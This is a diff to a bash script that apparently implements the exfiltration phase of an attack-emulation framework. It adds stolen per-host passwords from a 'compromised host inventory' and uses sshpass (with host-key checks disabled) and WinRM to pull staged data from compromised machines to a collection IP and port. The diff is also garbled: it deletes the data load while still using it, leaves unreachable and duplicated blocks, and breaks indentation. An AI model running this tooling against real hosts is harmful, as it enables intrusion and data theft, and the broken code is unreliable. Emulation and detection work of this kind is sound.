@@ -56,6 +56,7 @@ WINRM_HTTPS_PORT="${NORDIC_WINRM_HTTPS_PORT:-${NORDIC_DEFAULT_WINRM_HTTPS_PORT:-
 
 STAGING_STATE="$NORDIC_STATE_DIR/staged-data.json"
 EXFIL_STATE="$NORDIC_STATE_DIR/exfiltration.json"
+COMPROMISED_STATE="$NORDIC_COMPROMISED_STATE"
 
 LOG_FILE="$NORDIC_LOG_DIR/${INCIDENT_ID}-06-exfil.log"
 
@@ -143,6 +144,15 @@ if [[ ! -f "$STAGING_STATE" ]]; then
     exit 1
 fi
 
+if [[ ! -f "$COMPROMISED_STATE" ]]; then
+
+    echo "[ERROR] Missing compromised host inventory:"
+    echo "$COMPROMISED_STATE"
+    echo
+    echo "Run Phase 03 first."
+
+    exit 1
+fi
 
 if ! [[ "$EXFIL_PORT" =~ ^[0-9]+$ ]] ||
    (( EXFIL_PORT < 1024 || EXFIL_PORT > 65535 )); then
@@ -152,6 +162,7 @@ if ! [[ "$EXFIL_PORT" =~ ^[0-9]+$ ]] ||
 
     exit 1
 fi
+
 
 
 # ============================================================
@@ -210,19 +221,25 @@ fi
 #
 # Format:
 #
-# IP|PLATFORM|ACCESS|PORT|USER|FILE|SIZE|HASH
-#
+# IP|PLATFORM|ACCESS|PORT|USER|PASSWORD|FILE|SIZE|HASH#
+
 # Old Linux-only staged-data.json is also supported.
 # ============================================================
 
 mapfile -t STAGED_HOSTS < <(
 
-    python3 - "$STAGING_STATE" <<'PY'
+    python3 - "$STAGING_STATE" "$COMPROMISED_STATE" <<'PY'
 import json
 import sys
 
-with open(sys.argv[1], encoding="utf-8") as f:
-    data = json.load(f)
+with open(sys.argv[2], encoding="utf-8") as f:
+    compromised_data = json.load(f)
+
+compromised_by_ip = {
+    host.get("ip"): host
+    for host in compromised_data.get("hosts", [])
+    if host.get("ip")
+}
 
 
 for host in data.get("hosts", []):
@@ -235,6 +252,7 @@ for host in data.get("hosts", []):
     if not ip:
         continue
 
+        compromised = compromised_by_ip.get(ip, {})
 
     platform = host.get(
         "platform",
@@ -257,18 +275,26 @@ for host in data.get("hosts", []):
 
     if platform == "linux":
 
-        port = host.get(
-            "ssh_port",
-            22
-        )
+    port = host.get(
+        "ssh_port",
+        22
+    )
 
-        user = (
-            host.get("ssh_username")
-            or host.get("ssh_user")
-            or "ubuntu"
-        )
+    user = (
+        compromised.get("ssh_username")
+        or compromised.get("ssh_user")
+        or host.get("ssh_username")
+        or host.get("ssh_user")
+        or "ubuntu"
+    )
 
-        access = "ssh"
+    password = (
+        compromised.get("ssh_password")
+        or compromised.get("password")
+        or ""
+    )
+
+    access = "ssh"
 
 
     elif platform == "windows":
@@ -279,9 +305,17 @@ for host in data.get("hosts", []):
         )
 
         user = (
-            host.get("rdp_username")
+            compromised.get("rdp_username")
+            or compromised.get("rdp_user")
+            or host.get("rdp_username")
             or host.get("rdp_user")
             or "Administrator"
+        )
+
+        password = (
+            compromised.get("rdp_password")
+            or compromised.get("password")
+            or ""
         )
 
         access = "winrm"
@@ -292,12 +326,13 @@ for host in data.get("hosts", []):
 
 
     print(
-        "{}|{}|{}|{}|{}|{}|{}|{}".format(
+        "{}|{}|{}|{}|{}|{}|{}|{}|{}".format(
             ip,
             platform,
             access,
             port,
             user,
+            password,
             host.get("file", ""),
             host.get("size", 0),
             host.get("sha256", ""),
@@ -608,11 +643,22 @@ for RECORD in "${STAGED_HOSTS[@]}"; do
         ACCESS \
         ACCESS_PORT \
         ACCESS_USER \
+        ACCESS_PASSWORD \
         REMOTE_FILE \
         EXPECTED_SIZE \
         EXPECTED_HASH \
         <<< "$RECORD"
 
+    if [[ -z "$ACCESS_PASSWORD" ]]; then
+
+        if [[ "$PLATFORM" == "linux" ]]; then
+            ACCESS_PASSWORD="$SSH_PASSWORD"
+
+        elif [[ "$PLATFORM" == "windows" ]]; then
+            ACCESS_PASSWORD="$RDP_PASSWORD"
+        fi
+
+    fi
 
     echo
     echo "------------------------------------------------------------"
@@ -636,7 +682,7 @@ for RECORD in "${STAGED_HOSTS[@]}"; do
     if [[ "$PLATFORM" == "linux" ]]; then
 
 
-        if [[ -z "$SSH_PASSWORD" ]]; then
+        if [[ -z "$ACCESS_PASSWORD" ]]; then
 
             FAILED_COUNT=$(( FAILED_COUNT + 1 ))
 
@@ -646,26 +692,42 @@ for RECORD in "${STAGED_HOSTS[@]}"; do
                 "EXFIL_FAILED source=$HOST platform=linux reason=missing_credentials"
 
             continue
-        fi
+        # ========================================================
+# LINUX
+# ========================================================
+
+if [[ "$PLATFORM" == "linux" ]]; then
+
+    if [[ -z "$ACCESS_PASSWORD" ]]; then
+
+        FAILED_COUNT=$(( FAILED_COUNT + 1 ))
+
+        log "[WARNING] SSH password unavailable for $HOST"
+
+        ground_truth \
+            "EXFIL_FAILED source=$HOST platform=linux reason=missing_credentials"
+
+        continue
+    fi
 
 
-        REMOTE_RESULT="$(
-            sshpass -p "$SSH_PASSWORD" \
-                ssh \
-                    -p "$ACCESS_PORT" \
-                    -o StrictHostKeyChecking=no \
-                    -o UserKnownHostsFile=/dev/null \
-                    -o ConnectTimeout="$NORDIC_SSH_TIMEOUT" \
-                    -o PreferredAuthentications=password \
-                    -o PubkeyAuthentication=no \
-                    -o NumberOfPasswordPrompts=1 \
-                    "$ACCESS_USER@$HOST" \
-                    bash -s -- \
-                        "$REMOTE_FILE" \
-                        "$INCIDENT_IP" \
-                        "$EXFIL_PORT" \
-                        "$HOST" \
-                        "$INCIDENT_ID" <<'REMOTE'
+    REMOTE_RESULT="$(
+        sshpass -p "$ACCESS_PASSWORD" \
+            ssh \
+                -p "$ACCESS_PORT" \
+                -o StrictHostKeyChecking=no \
+                -o UserKnownHostsFile=/dev/null \
+                -o ConnectTimeout="$NORDIC_SSH_TIMEOUT" \
+                -o PreferredAuthentications=password \
+                -o PubkeyAuthentication=no \
+                -o NumberOfPasswordPrompts=1 \
+                "$ACCESS_USER@$HOST" \
+                bash -s -- \
+                    "$REMOTE_FILE" \
+                    "$INCIDENT_IP" \
+                    "$EXFIL_PORT" \
+                    "$HOST" \
+                    "$INCIDENT_ID" <<'REMOTE'
 
 REMOTE_FILE="$1"
 INCIDENT_IP="$2"
@@ -780,7 +842,7 @@ REMOTE
     elif [[ "$PLATFORM" == "windows" ]]; then
 
 
-        if [[ -z "$RDP_PASSWORD" ]]; then
+        if [[ -z "$ACCESS_PASSWORD" ]]; then
 
             FAILED_COUNT=$(( FAILED_COUNT + 1 ))
 
@@ -862,7 +924,7 @@ REMOTE
         # ----------------------------------------------------
 
         WINDOWS_RESULT="$(
-            NORDIC_WINRM_PASSWORD="$RDP_PASSWORD" \
+            NORDIC_WINRM_PASSWORD="$ACCESS_PASSWORD" \
             python3 - \
                 "$HOST" \
                 "$WINRM_PORT" \
